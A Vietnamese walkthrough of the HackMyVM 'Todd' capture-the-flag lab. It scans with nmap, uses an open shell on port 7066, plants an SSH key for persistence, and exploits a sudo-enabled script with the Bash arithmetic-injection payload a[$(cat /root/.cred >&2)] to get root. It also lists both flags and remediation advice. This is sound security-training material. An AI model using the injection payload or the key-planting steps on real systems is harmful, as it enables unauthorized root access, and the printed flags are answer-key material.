# HackMyVM — Todd

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy Todd (Target) | `10.0.2.3` |
| Hostname | `todd` |
| SSH | `22/tcp` — OpenSSH 7.9p1 Debian 10+deb10u2 |
| HTTP | `80/tcp` — Apache 2.4.59 (Debian) |
| Shell port | `7066/tcp` |
| Initial user | `todd` |
| User flag | `Todd{eb93009a2719640de486c4f68daf62ec}` |
| Root password | `fake password` |
| Root flag | `Todd{389c9909b8d6a701217a45104de7aa21}` |

> **Quy ước 2 terminal**
>
> - 🟦 **Terminal Kali**: scan, kết nối port 7066, tạo SSH key, SSH vào Target.
> - 🟥 **Terminal Todd**: kiểm tra quyền, đọc script, chạy privilege escalation và lấy flag.
>
> **Không chạy nhầm lệnh giữa 2 máy.**

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định các cổng mạng đang mở, dịch vụ đang chạy trên các cổng đó và các thông tin liên quan có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Xác định Target và kiểm tra kết nối

### 🟦 Kali

```bash
nmap -sn 10.0.2.0/24
```

Target của bài:

```text
10.0.2.3
```

Kiểm tra kết nối:

```bash
ping -c 4 10.0.2.3
```

Máy Target đang hoạt động và có thể kết nối từ Kali.

---

## 1.2. Quét toàn bộ TCP

### 🟦 Kali

```bash
nmap -p- -Pn -T4 10.0.2.3
```

Kết quả quan trọng:

```text
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
7066/tcp  open  unknown
```

Các cổng cần chú ý:

```text
22/tcp    SSH
80/tcp    HTTP
7066/tcp  Shell service  ← điểm vào chính
```

> **Lưu ý:** Không cần mất thời gian khai thác web trước. Port `7066` là điểm vào chính.

---

## 1.3. Nhận diện dịch vụ

### 🟦 Kali

```bash
nmap -sC -sV -Pn -T4 -p22,80,7066 10.0.2.3
```

Kết quả:

```text
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
7066/tcp open  unknown
```

HTTP title:

```text
Mindful Listening
```

---

## 1.4. Xác định điểm vào

```text
22/tcp   SSH
80/tcp   HTTP
7066/tcp Shell (todd)  ← điểm vào chính
```

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

**Thực hiện khai thác shell trên port 7066 để đạt quyền truy cập ban đầu, duy trì truy cập bằng SSH key, sau đó khai thác script sudo để lấy credential root và đọc `root.txt`.**

## 2.1. Kết nối shell port 7066

### 🟦 Kali

```bash
nc -nv 10.0.2.3 7066
```

Kiểm tra:

```bash
whoami
```

Kết quả:

```text
todd
```

```bash
id
```

Kết quả:

```text
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

**Đã có foothold** với tài khoản `todd`.

> Shell trên 7066 dễ bị đóng. Cần **cài SSH key ngay** để duy trì truy cập.

---

## 2.2. Tạo SSH key persistence

### 🟦 Kali — chuẩn bị public key

Kiểm tra key hiện có:

```bash
ls -la /root/.ssh/
```

Nếu chưa có key:

```bash
ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
```

Lấy public key (copy **nguyên một dòng**, không cắt ngắn):

```bash
cat /root/.ssh/id_ed25519.pub
```

### 🟥 Todd (trong shell 7066)

```bash
mkdir -p /home/todd/.ssh
chmod 700 /home/todd/.ssh
```

Thêm public key (thay `PUBLIC_KEY_ĐẦY_ĐỦ` bằng nội dung thật từ `id_ed25519.pub`):

```bash
echo 'PUBLIC_KEY_ĐẦY_ĐỦ' >> /home/todd/.ssh/authorized_keys
chmod 600 /home/todd/.ssh/authorized_keys
cat /home/todd/.ssh/authorized_keys
```

Thoát shell 7066:

```bash
exit
```

---

## 2.3. SSH vào Todd

### 🟦 Kali

```bash
ssh -i /root/.ssh/id_ed25519 todd@10.0.2.3
```

Kiểm tra:

```bash
whoami
```

Kết quả:

```text
todd
```

**Từ đây trở đi chỉ dùng SSH. Không tiếp tục làm việc dài trong shell 7066.**

---

## 2.4. Lấy User Flag

### 🟥 Todd

```bash
cat /home/todd/user.txt
```

Kết quả:

```text
Todd{eb93009a2719640de486c4f68daf62ec}
```

---

## 2.5. Kiểm tra quyền sudo

### 🟥 Todd

```bash
sudo -l
```

Kết quả quan trọng:

```text
User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
```

Đường privilege escalation:

```text
/bin/bash /srv/guess_and_check.sh
```

> Không cần quan tâm `/usr/bin/rm` và `/usr/sbin/reboot` trong bài này.

---

## 2.6. Đọc hint và phân tích script

### 🟥 Todd

```bash
cat /srv/note.jpg
```

Kết quả:

```text
u can try bash -x guess_and_check.sh
```

Đọc source:

```bash
cat /srv/guess_and_check.sh
```

### Điểm quan trọng trong script

```bash
a=$((RANDOM%1000))
...
read -p ">>>" input_number
[[ $input_number -ne "$a" ]] && exit 1
...
true_file="/tmp/$((RANDOM%1000))"
false_file="/tmp/$((RANDOM%1000))"
[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

**Điểm khai thác:**

```bash
[[ $input_number -ne "$a" ]]
```

Input của người dùng được đưa trực tiếp vào phép so sánh số học của Bash → **Bash arithmetic injection**.

---

## 2.7. Những hướng KHÔNG được làm

> Đây là các lỗi đã gặp trong thực hành. **Không lặp lại.**

| ❌ Không làm | Lý do |
|---|---|
| `for i in $(seq 0 999); do : > /tmp/$i; done` | Tạo cả `true_file` và `false_file` → điều kiện thất bại |
| Tạo `auto_solve.py` / race condition | Không cần, dễ làm SSH bị rớt |
| Đoán RANDOM liên tục | Không phải hướng giải |
| Nhập số `XXX` mà script hỏi | Sẽ fail so sánh |

---

## 2.8. Khai thác arithmetic injection

### 🟥 Todd

Chạy script bằng sudo:

```bash
sudo /bin/bash /srv/guess_and_check.sh
```

Script hỏi:

```text
Please Input [XXX]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>
```

**Không nhập số.** Nhập **chính xác** payload sau:

```text
a[$(cat /root/.cred >&2)]
```

Kết quả sẽ in ra:

```text
fake password
```

Đây chính là nội dung của `/root/.cred`.

> **Payload phải đúng format:**
>
> - Đúng: `a[$(cat /root/.cred >&2)]`
> - Sai: `a[cat /root/.cred]`
> - Sai: `$(cat /root/.cred)`

---

## 2.9. SSH vào root

### 🟦 Kali

```bash
ssh root@10.0.2.3
```

Password:

```text
fake password
```

Kiểm tra:

```bash
whoami
```

Kết quả:

```text
root
```

```bash
id
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

## 2.10. Lấy Root Flag

### 🟥 Todd (đã là root)

```bash
cat /root/root.txt
```

Kết quả:

```text
Todd{389c9909b8d6a701217a45104de7aa21}
```

---

## 2.11. Chuỗi khai thác hoàn chỉnh

```text
┌────────────────────────┐
│ 🟦 KALI                │
│ 10.0.2.15              │
└───────────┬────────────┘
            │
            │ nmap → 7066
            ▼
┌────────────────────────┐
│ nc 10.0.2.3 7066       │
│ shell todd             │
└───────────┬────────────┘
            │
            │ cài SSH public key
            ▼
┌────────────────────────┐
│ SSH todd@10.0.2.3      │
│ user.txt               │
└───────────┬────────────┘
            │
            │ sudo -l
            ▼
┌────────────────────────┐
│ /srv/guess_and_check.sh│
│ arithmetic injection   │
└───────────┬────────────┘
            │
            │ a[$(cat /root/.cred >&2)]
            ▼
┌────────────────────────┐
│ /root/.cred            │
│ fake password          │
└───────────┬────────────┘
            │
            │ SSH root
            ▼
┌────────────────────────┐
│ root                   │
│ /root/root.txt         │
└────────────────────────┘
```

---

## 2.12. Hai terminal — làm theo đúng thứ tự

### 🟦 TERMINAL KALI

```bash
# 1. Host discovery + ping
nmap -sn 10.0.2.0/24
ping -c 4 10.0.2.3

# 2. Scan TCP
nmap -p- -Pn -T4 10.0.2.3
nmap -sC -sV -Pn -T4 -p22,80,7066 10.0.2.3

# 3. Kết nối shell 7066
nc -nv 10.0.2.3 7066
# Trong shell: whoami / id

# 4. Chuẩn bị SSH key (nếu chưa có)
ls -la /root/.ssh/
ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
cat /root/.ssh/id_ed25519.pub
# → copy nguyên 1 dòng public key

# 5. Trong shell 7066: cài key (thay PUBLIC_KEY)
# mkdir -p /home/todd/.ssh
# chmod 700 /home/todd/.ssh
# echo 'PUBLIC_KEY_ĐẦY_ĐỦ' >> /home/todd/.ssh/authorized_keys
# chmod 600 /home/todd/.ssh/authorized_keys
# cat /home/todd/.ssh/authorized_keys
# exit

# 6. SSH vào todd
ssh -i /root/.ssh/id_ed25519 todd@10.0.2.3
```

### 🟥 TERMINAL TODD

```bash
# 7. User flag
whoami
id
cat /home/todd/user.txt

# 8. Sudo
sudo -l

# 9. Đọc hint + script
cat /srv/note.jpg
cat /srv/guess_and_check.sh

# 10. Privilege escalation
sudo /bin/bash /srv/guess_and_check.sh
# Khi hỏi >>> nhập đúng:
# a[$(cat /root/.cred >&2)]
# → nhận được: fake password
```

### 🟦 TERMINAL KALI (lấy root)

```bash
# 11. SSH root
ssh root@10.0.2.3
# Password: fake password

# 12. Root flag
whoami
id
cat /root/root.txt
```

---

# 3. Câu 3 — Đề xuất biện pháp khắc phục

**Phân tích nguyên nhân dẫn đến khả năng khai thác hệ thống và đề xuất các biện pháp khắc phục.**

## 3.1. Nguyên nhân chính

### 1. Dịch vụ shell mở trên port 7066

Port `7066` cung cấp shell trực tiếp với quyền `todd` mà không cần xác thực.

### 2. Sudo misconfiguration

```text
(ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
```

Cho phép chạy script với quyền root.

### 3. Bash arithmetic injection

Script đưa input người dùng trực tiếp vào:

```bash
[[ $input_number -ne "$a" ]]
```

→ Cho phép thực thi lệnh qua arithmetic expansion.

### 4. Credential root lưu plaintext

File `/root/.cred` chứa password dùng để đăng nhập root.

---

## 3.2. Biện pháp khắc phục

### Đóng / bảo vệ port 7066

- Không mở shell service công khai.
- Nếu cần, chỉ lắng nghe localhost và dùng firewall hạn chế nguồn.

### Sửa script sudo

- Không cấp `NOPASSWD` cho script nhận input tùy ý.
- Validate input chặt chẽ (chỉ cho phép số nguyên).
- Không dùng input trong arithmetic context của Bash.
- Áp dụng Least Privilege.

### Không lưu password plaintext

- Không lưu credential root trong file dễ đọc.
- Dùng cơ chế xác thực an toàn hơn.

### Logging & Monitoring

Theo dõi:

- Kết nối tới port 7066
- Sudo invocation của `guess_and_check.sh`
- Truy cập `/root/.cred`
- Đăng nhập SSH root bất thường

---

# Kết luận ngắn gọn

## Câu 1

Target:

```text
10.0.2.3
```

Dịch vụ quan trọng:

```text
22/tcp   SSH
80/tcp   HTTP
7066/tcp Shell (todd)  ← điểm vào
```

## Câu 2

Chuỗi khai thác:

```text
nc 7066 → todd
      ↓
Cài SSH key → SSH todd
      ↓
user.txt
      ↓
sudo -l → /srv/guess_and_check.sh
      ↓
a[$(cat /root/.cred >&2)]
      ↓
fake password
      ↓
SSH root → root.txt
```

User flag:

```text
Todd{eb93009a2719640de486c4f68daf62ec}
```

Root flag:

```text
Todd{389c9909b8d6a701217a45104de7aa21}
```

## Câu 3

Khắc phục trọng tâm:

```text
Đóng/bảo vệ port 7066
        +
Không cấp sudo rộng cho script nhận input
        +
Validate input, tránh arithmetic injection
        +
Không lưu password plaintext
        +
Least Privilege + Logging
```

---

# Flags

### User Flag

```text
Todd{eb93009a2719640de486c4f68daf62ec}
```

### Root Flag

```text
Todd{389c9909b8d6a701217a45104de7aa21}
```

---

# 5 lỗi cần tránh nhất

| Lỗi | Cách tránh |
|---|---|
| Mất shell 7066 | Có shell → cài SSH key ngay |
| SSH key lỗi / bị cắt | Copy **nguyên dòng** `.pub` |
| Gặp `quote>` | `Ctrl+C`, nhập lại lệnh |
| Sa vào race `/tmp` | **Bỏ hoàn toàn** hướng này |
| Chạy Python/auto_solve | **Không cần** |

---

# Một câu nhớ cả bài

```text
7066 → todd → SSH key → SSH todd → sudo -l → guess_and_check.sh → a[$(cat /root/.cred >&2)] → fake password → SSH root → root.txt
```
